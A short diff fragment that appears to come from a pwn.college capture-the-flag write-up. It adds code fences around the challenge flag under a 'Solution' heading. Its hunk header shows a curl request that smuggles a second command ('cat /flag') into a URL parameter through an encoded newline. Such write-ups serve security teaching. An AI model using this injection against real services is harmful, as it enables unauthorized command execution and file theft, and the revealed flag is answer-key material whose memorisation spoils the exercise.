@@ -13,4 +13,6 @@ curl http://challenge.localhost:80/exercise?root=/flag%0Acat%20/flag
 
 ## Solution
 
+```
 pwn.college{sxWgPqRw_O7j5bMi6FgSztWFuih.dRzN1YDL3MTM3QzW}
+```
